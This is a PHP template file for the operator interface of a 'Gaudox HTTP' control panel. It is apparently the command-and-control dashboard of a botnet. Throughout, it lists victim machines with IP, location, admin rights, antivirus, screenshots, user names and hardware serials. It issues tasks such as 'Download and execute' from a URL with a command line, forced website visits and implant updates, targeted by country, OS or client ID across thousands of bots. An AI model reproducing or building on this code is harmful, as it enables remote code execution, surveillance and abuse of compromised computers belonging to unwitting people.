<?php
define("GDX_CLIENT_STATUS_ONLINE", 3);
define("GDX_CLIENT_STATUS_OFFLINE", 2);
define("GDX_CLIENT_STATUS_DEAD", 1);

define("GDX_LOGOUT_OPT", "logout");
define("GDX_CLIENTS_OPT", "clients");
define("GDX_TASKS_OPT", "tasks");
define("GDX_SETTINGS_OPT", "settings");

define("GDX_PAGE_HTML_O", "<!DOCTYPE HTML>
<html>
    <head>");
    
define("GDX_PAGE_HTML_C", "</html>");
    
define("GDX_PAGE_HEAD_O", "
    <title>Control Panel</title>
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    
    <link href='css/font-awesome.min.css' rel='stylesheet' type='text/css'>
    <link href='css/jqvmap.css' rel='stylesheet' type='text/css'/>
    <link href='css/jquery.jqplot.min.css' rel='stylesheet' type='text/css'/>
    <link href='css/bootstrap.css' rel='stylesheet' type='text/css'/>
    <link href='css/gdx.css' rel='stylesheet' type='text/css'/>
    
    
    <script src='js/jquery.js' type='text/javascript'></script>
    <script src='js/jquery.vmap.js' type='text/javascript'></script>
    <script src='js/jquery.vmap.world.js' type='text/javascript'></script>
    <script src='js/jquery.jqplot.min.js' type='text/javascript'></script>
    <script src='js/jqplot.pieRenderer.min.js' type='text/javascript'></script>
    <script src='js/bootstrap.js' type='text/javascript'></script>
    <script src='js/gdx.js' type='text/javascript'></script>
    ");
    
define("GDX_PAGE_HEAD_C", "    </head>");

define("GDX_SCRIPT_TAG_O", "<script>
        ");
        
define("GDX_SCRIPT_TAG_C", "    </script>");

define("GDX_PAGE_BODY_O", "
    <body onload='ChangeLayoutTasks(\"DownloadAndExecute\")'>
    ");

define("GDX_PAGE_BODY_C", "
    </body>
");

define("GDX_PAGE_CONT_O", "
        <div class='container-fluid'>");

define("GDX_PAGE_CONT_C", "
        </div>");

define("GDX_JQUERY_TOP_5", "
        jQuery(document).ready(function(){
        var data = [ ['%s', %d],['%s', %d],['%s', %d], ['%s', %d],['%s', %d] ];
            var plot1 = jQuery.jqplot ('chart', [data], 
            { 
                title: 'TOP 5 countries',
                seriesColors: [ '#6C6CD9', '#84D96C', '#D96C6C', '#D9D56C', '#6CD2D9'],
                seriesDefaults: {
                    renderer: jQuery.jqplot.PieRenderer, 
                    rendererOptions: {
                        showDataLabels: true
                    }
                }, 
                legend: { show:true, location: 'e' },
            }
            );
        });
");


define("GDX_JQVMAP", "
        jQuery(document).ready(function () 
        {
            var ch = {
                %s
            }
        
            jQuery('#cmap').vectorMap({
            map: 'world_en',
            colors: ch,
            borderColor: '#000',
            borderOpacity: 0,
            borderWidth: 1,
            backgroundColor: '#ffffff',
            hoverColor: '#222',
            selectedColor: '#666666',
            enableZoom: true,
            showTooltip: true,
            normalizeFunction: 'polynomial'
            });
        });
");

define("GDX_TOP_NAVBAR", "
        <nav class='navbar navbar-inverse navbar-static-top' role='navigation'>
        <div class='navbar-header'>
          <a class='navbar-brand' href='main.php'>Gaudox HTTP</a>
        </div>
        <div class='collapse navbar-collapse navbar-ex1-collapse'>
            <ul class='nav navbar-nav side-nav'>
                <li><a href='main.php?op=clients'><i class='fa fa-users gdx-opt'></i> Clients</a></li>
                <li><a href='main.php?op=tasks'><i class='fa fa-tasks gdx-opt'></i> Tasks</a></li>
                <li><a href='main.php?op=settings'><i class='fa fa-wrench gdx-opt'></i> Settings</a></li>
            </ul>
            <ul class='nav navbar-nav navbar-right navbar-user'>
                <li class='dropdown user-dropdown'>
                    <a href='' class='dropdown-toggle gdx-opt' data-toggle='dropdown'><i class='fa fa-user'></i> %s <b class='caret'></b></a>
                    <ul class='dropdown-menu'>
                        <li><a href='main.php?op=logout'><i class='fa fa-power-off gdx-opt'></i> Logout</a></li>
                    </ul>
                </li>
            </ul>
        </div>
        </nav>");

define("GDX_CLIENTS_PAGE_P1_O", "
            <div class='gdx-chartmap'>
                <div class='gdx-statis'>
                    <div class='panel panel-default'>
                        <div class='panel-heading panel-heading-sm'>
                            <p class='panel-title panel-title-sm gdx-statis-title'>Statistics</p>
                        </div>
                        <div class='panel-body panel-body-sm gdx-panel-statis-body'>
                            <div class='gdx-panel-statis-table'>
                            
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Total Clients:</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients Online:</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients Offline:</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients Dead:</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 3h):</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 24h):</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 3days):</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Clients online (Past 7days):</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>New Clients (Past 24h):</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>New Clients (Past 3days):</div>
                                    <div class='gdx-panel-statis-td2'>%d</div>
                                </div>
                                
                                <hr>
                                
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Admin Rights:</div>
                                    <div class='gdx-panel-statis-td2'>%d %%</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Antivirus Product:</div>
                                    <div class='gdx-panel-statis-td2'>%d %%</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>NET Framework:</div>
                                    <div class='gdx-panel-statis-td2'>%d %%</div>
                                </div>
                                <div class='gdx-panel-statis-tr'>
                                    <div class='gdx-panel-statis-td'>Java VM:</div>
                                    <div class='gdx-panel-statis-td2'>%d %%</div>
                                </div>
                                
                            </div>
                        </div>
                    </div>
                </div>
                <div class='gdx-chart' id='chart'></div>
                <div class='gdx-map'>
                    <div class='gdx-map-map' id='cmap'></div>
                    <div class='gdx-map-label'>
                        <div class='gdx-map-clbox' style='background-color: #12FF14'></div> 1 - 50 | 
                        <div class='gdx-map-clbox' style='background-color: #0C962C'></div> 51 - 200 | 
                        <div class='gdx-map-clbox' style='background-color: #FFFB14'></div> 201 - 500 | 
                        <div class='gdx-map-clbox' style='background-color: #FF9914'></div> 501 - 1000 | 
                        <div class='gdx-map-clbox' style='background-color: #FF1414'></div> 1001 - 5000 | 
                        <div class='gdx-map-clbox' style='background-color: #A30000'></div> 5001+
                    </div>
                </div>
            </div>
            <hr>
            <form action='main.php?op=clients' method='get'>
            <div class='form-inline'>
                <input type='hidden' name='op' value='clients'/>
                Number of clients per page:
                <select class='form-control gdx-select' style='width:80px' name='cpp'>
                    <option>50</option>
                    <option>100</option>
                    <option>200</option>
                    <option>500</option>
                </select>&nbsp;&nbsp;&nbsp;
                Sorting:
                <select name='sor' class='form-control gdx-select' style='width:240px'>
                    <option value='Status'>Status</option>
                    <option value='Version'>Version</option>
                    <option value='Location'>Location</option>
                    <option value='OperatingSystem'>Operating System</option>
                    <option value='InstallDate'>Installation Date</option>
                    <option value='LastCheck'>Last Seen</option>
                </select>&nbsp;&nbsp;&nbsp;
                Order:
                <select name='ord' class='form-control gdx-select' style='width:150px'>
                    <option value='Asc'>Ascending</option>
                    <option value='Des'>Descending</option>
                </select>&nbsp;&nbsp;&nbsp;
                
                <button type='submit' class='btn btn-primary btn-xs'>Set Options</button>
            </div>
            </form>
            <hr>
            <table class='table table-bordered'>
                <thead>
                    <tr>
                        <th style='width:280px'>Client ID</th>
                        <th style='width:80px; text-align: center'>Version</th>
                        <th style='width:120px; text-align: center'>IP Address</th>
                        <th style='width:100px; text-align: center'>Location</th>
                        <th style='width:220px; text-align: center'>O.S / Architecture</th>
                        <th style='width:200px; text-align: center'>Antivirus</th>
                        <th style='width:180px; text-align: center'>Installation Date</th>
                        <th style='width:180px; text-align: center'>Last Seen</th>
                        <th style='width:auto; text-align: center'>Status</th>
                        <th style='width:auto; text-align: center'>Options</th>
                    </tr>
                </thead>
                <tbody>
                ");

// 10+ parameters
define("GDX_CLIENTS_PAGE_CLT_INF", "
                <tr>
                    <td>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'><img src='images/flags/%s.png'> %s</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td align='center'>%s</td>
                    <td align='center'>
                        <a class='gdx-pointer' onclick=\"$('#%s').toggle();\">Details</a>
                    </td>
                </tr>
                
                <tr id='%s' style='display:none'>
                    <td colspan='100%%'>
                        <div class='gdx-table-clt-info'>
                            <form action='' method='get'>
                                <input type='hidden' name='op' value='tasks' />
                                <button name='cid' value='%s' class='btn btn-primary btn-xs'>Create new task for this client</button>
                            </form>
                            <hr>
                            <div align='center'>
                                <a href='screenshots/%s.jpeg'><img src='screenshots/%s.jpeg' height='400' width='600'></a>
                            </div>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Client ID: </b>%s
                                </div>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Version: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Has Admin Rights: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>IP Address: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Location: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Installation Date: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Last Seen: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>File Path: </b>%s
                                </div>
                            </div>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>Windows Version: </b>%s Build %s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>PC Name: </b>%s
                                </div>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>User Name: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Serial Number: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Local Time: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>Windows Directory: </b>%s
                                </div>
                            </div>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Antivirus Product: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Default Browser: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Has NET Framework Installed: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Has Java VM Installed: </b>%s
                                </div>
                            </div>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>Computer Model: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>BIOS: </b>%s (%s)
                                </div>
                                <div class='gdx-cltdet' style='width: 30%%'>
                                    <b>Version: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Serial: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>CPU: </b>%s (%s)
                                </div>
                                <div class='gdx-cltdet' style='width: 30%%'>
                                    <b>Architecture: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Number Of Processors: </b>%d
                                    </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Video Adapter: </b>%s
                                </div>
                                <div class='gdx-cltdet' style='width: 30%%'>
                                    <b>Resolution: </b>%s
                                </div>
                                <div class='gdx-cltdet'>
                                    <b>Refresh Rate: </b>%s HZ
                                </div>
                            </div>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Physical Memory: </b>%s
                                </div>
                            </div>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet' style='width: 40%%'>
                                    <b>Hard Disk: </b>%s
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
");

define("GDX_TASKS_PAGE_TABLE_O", "
            %s
            <div class='gdx-tasks-statistics'>
                <div class='panel panel-default'>
                    <div class='panel-heading panel-heading-sm'>
                        <p class='panel-title panel-title-sm gdx-statis-title'>Statistics</p>
                    </div>
                    <div class='panel-body panel-body-sm gdx-panel-statis-body'>
                        <div class='gdx-panel-statis-table'>
                        
                            <div class='gdx-panel-statis-tr'>
                                <div class='gdx-panel-statis-td'>Total Tasks:</div>
                                <div class='gdx-panel-statis-td2'>%d</div>
                            </div>
                            <div class='gdx-panel-statis-tr'>
                                <div class='gdx-panel-statis-td'>Tasks Executing:</div>
                                <div class='gdx-panel-statis-td2'>%d</div>
                            </div>
                            
                            <hr>
                            
                            <div class='gdx-panel-statis-tr'>
                                <div class='gdx-panel-statis-td'>Total Tasks Sent:</div>
                                <div class='gdx-panel-statis-td2'>%d</div>
                            </div>
                            <div class='gdx-panel-statis-tr'>
                                <div class='gdx-panel-statis-td'>Total Tasks Executed:</div>
                                <div class='gdx-panel-statis-td2'>%d</div>
                            </div>
                            <div class='gdx-panel-statis-tr'>
                                <div class='gdx-panel-statis-td'>Total Tasks Failed:</div>
                                <div class='gdx-panel-statis-td2'>%d</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
                
            <div class='gdx-tasks-table'>
                <table class='table table-bordered'>
                <thead>
                    <tr>
                        <th style='width:250px'>Name</th>
                        <th style='width:200px; text-align: center'>Type</th>
                        <th style='width:220px; text-align: center'>Sent / Executed / Failed / Max</th>
                        <th style='width:180px; text-align: center'>Creation Date</th>
                        <th style='width:180px; text-align: center'>Expiration Date</th>
                        <th style='width:auto; text-align: center'>Status</th>
                        <th style='width:auto; text-align: center'>Options</th>
                    </tr>
                </thead>
                <tbody>
");

define("GDX_TASKS_PAGE_TASK_INF", "
                <tr>
                    <td>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'>%d / %d / %d / %d</td>
                    <td style='text-align: center'>%s</td>
                    <td style='text-align: center'>%s</td>
                    <td align='center'>%s</td>
                    <td align='center'>
                        <a class='gdx-pointer' onclick=\"$('#%s').toggle();\">Details</a>
                    </td>
                </tr>
                <tr id='%s' style='display:none'>
                    <td colspan='7'>
                        <div class='gdx-table-clt-info'>
                            <form action='' method='post'>
                                <button name='SuspendTask' value='%s' class='btn btn-primary btn-xs'>%s</button>
                                <button name='DeleteTask' value='%s' class='btn btn-danger btn-xs'>Delete</button>
                            </form>
                            <hr>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>Task ID: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>Client ID Filter: </b>%s
                                </div>
                            </div>
                            <div class='gdx-clt-info-block'>
                                <div class='gdx-cltdet'>
                                    <b>Location ID Filter: </b>%s
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
");

define("GDX_TASKS_PAGE_TABLE_C", "
                </tbody>
                </table>
            </div>
");

define("GDX_TASKS_PAGE_NEW_TASK", "
            <hr>
            <div>
                <div class='panel panel-default'>
                    <div class='panel-heading' style='font-weight: bold'>Create New Task</div>
                    <div class='panel-body'>
                    
                    <form method='post'>
                    
                        <div align='center'>
                            <select class='form-control gdx-select gdx-select-command' name='TaskType' onChange='ChangeLayoutTasks(this.value);'>
                                <option value='DownloadAndExecute'>Download and execute</option>
                                <option value='VisitWebsite'>Visit Website</option>
                                <option value='UpdateClient'>Update Client</option>
                                <option value='UnInstallClient'>UnInstall Client</option>
                            </select>
                        <div>
                        <br/>
                        <hr>
                        <div class='gdx-t-table' style='text-align: left'>
                            <div class='gdx-t-row'>
                                <label class='gdx-tasks-label gdx-t-cell'>Task Name:</label>
                                <input class='gdx-tasks-textbox gdx-t-cell form-control' type='text' name='TaskName' autocomplete:'off'/>
                            </div>
                        </div>
                        
                        <hr>
                        <div>
                            <div class='gdx-t-table'>
                                <div id='div_download_and_exec'>
                                    <div class='gdx-t-row'>
                                        <label class='gdx-tasks-label gdx-t-cell'>URL:</label>
                                        <input class='gdx-t-cell form-control gdx-tasks-textbox' type='text' name='DownloadFileURL' autocomplete:'off'/>
                                    </div>
                                    <div class='gdx-t-row'>
                                        <label class='gdx-tasks-label gdx-t-cell'>Command Line:</label>
                                        <input class='gdx-t-cell form-control gdx-tasks-textbox' type='text' name='CommandLine' autocomplete:'off'/>
                                    </div>
                                </div>

                                <div id='div_visit_website'>
                                    <div class='gdx-t-row'>
                                        <label class='gdx-tasks-label gdx-t-cell'>Website URL:</label>
                                        <input class='gdx-t-cell form-control gdx-tasks-textbox' type='text' name='WebsiteURL' autocomplete:'off'/>
                                    </div>
                                </div>

                                <div id='div_update_client'>
                                    <div class='gdx-t-row'>
                                        <label class='gdx-tasks-label gdx-t-cell'>URL:</label>
                                        <input class='gdx-t-cell form-control gdx-tasks-textbox' type='text' name='UpdateFileURL' autocomplete:'off'/>
                                    </div>
                                </div>
                                
                                <div id='div_uninstall_client' align='center'>
                                    <label class='gdx-t-cell cc-error'>Warning: this task will remove the client from host machine</label>
                                </div>
                            </div>
                        </div>
                        <hr>
                        
                        <div class='gdx-t-table'>
                            <div class='gdx-t-row'>
                                <div class='gdx-t-cell'>
                                    <label>Client IDs: ( ID1, ID2, ID3 )</label>
                                    <textarea class='form-control gdx-tasks-textarea' type='text' name='ClientIds' autocomplete:'off'>%s</textarea>
                                </div>
                                <div class='gdx-t-cell'>
                                    <label>Location IDs: ( FR, IT, IN ) </label>
                                    <textarea class='form-control gdx-tasks-textarea' type='text' name='LocationIds' autocomplete:'off'></textarea>
                                </div>
                            </div>
                            <br/>
                            <div class='gdx-t-row' style='border: 1px solid black'>
                                <label>Operating systems:</label>
                                <select multiple class='form-control gdx-tasks-textarea-os' name='OperatingSystems[]'>
                                    <option value='%s' selected='selected'>All Operating Systems</option>
                                    <option value='%s'>Windows XP</option>
                                    <option value='%s'>Windows 2003</option>
                                    <option value='%s'>Windows Vista</option>
                                    <option value='%s'>Windows 7</option>
                                    <option value='%s'>Windows 8</option>
                                    <option value='%s'>Windows 8.1</option>
                                    <option value='%s'>Windows 10</option>
                                </select>
                            </div>
                            <br/>
                            <div class='gdx-t-row'>
                                <label>Maximum Clients:</label>
                                <input class='gdx-tasks-textbox form-control' type='text' name='MaximumClients' value='9999' autocomplete:'off' style='width: 25%%'/>
                            </div>
                            <br/>
                            <div class='gdx-t-row'>
                                <label>Expiration Date: (DD-MM-YYYY) </label>
                                <input class='form-control gdx-tasks-textbox' type='text' name='ExpirationDate' value='+5 days' autocomplete:'off' style='width: 25%%'/>
                            </div>
                        </div>
                        <br/><br/><br/>
                        <div align='center'>
                            <input class='btn btn-default' type='submit' name='CreateNewTask' value='Create New Task' style='width: 20%%'/>
                        </div>
                    </form>
                </div>
            </div>
");


define("GDX_SETTINGS_PAGE", "
                    %s
                    <div class='panel panel-default'>
                        <div class='panel-heading' style='font-weight: bold'>Settings</div>
                        <div class='panel-body'>
                            <form action='' method='post'>
                                <div class='form-group'>
                                    <label>Knock Interval (Minutes): </label>
                                    <input name='Knock' type='text' class='form-control gdx-select' style='height: 28px; width:180px' value='%d'>
                                </div>
                                <div class='form-group'>
                                    <label>Days before bot is marked dead: </label>
                                    <input name='Dead' type='text' class='form-control gdx-select' style='height: 28px; width:180px' value='%d'>
                                </div>
                                <hr>
                                <div class='form-group'>
                                    <label>Current Password: </label>
                                    <input name='currentpassword' type='text' class='form-control gdx-select' style='height: 28px; width:200px'>
                                    <br/>
                                    <label>New Password: </label>
                                    <input name='newpassword1' type='text' class='form-control gdx-select' style='height: 28px; width:200px'>
                                    <label>Confirm Password: </label>
                                    <input name='newpassword2' type='text' class='form-control gdx-select' style='height: 28px; width:200px'>
                                </div>
                                <div class='text-center'>
                                    <button name='Set' class='btn btn-default'>Save Settings</button>
                                </div>
                            </form>
                        </div>
                    </div>
");

define("GDX_CLIENTS_PAGE_P1_C", "
                </tbody>
            </table>
            ");

// 1 parameter
define("GDX_CLIENTS_PAGE_PAG_O", "
            <div style='text-align: center'>
                <ul class='pagination pagination-sm' style='align:center'>
                    <li>
                        <a href='%s' aria-label='Previous'>
                            <span aria-hidden='true'>&laquo;</span>
                        </a>
                    </li>
                ");
                    
// 2 parameters
define("GDX_CLIENTS_PAGE_PAG_E", "
                    <li %s><a href='%s'>%d</a></li>");
                    
// 1 parameter
define("GDX_CLIENTS_PAGE_PAG_C", "
                    <li>
                        <a href='%s' aria-label='Next'>
                            <span aria-hidden='true'>&raquo;</span>
                        </a>
                    </li>
                </ul>
            </div>
");

define("GDX_CLIENTS_NEXT_PAG", "main.php?op=clients&cpp=%d&sor=%s&ord=%s&pag=%d")

                
?>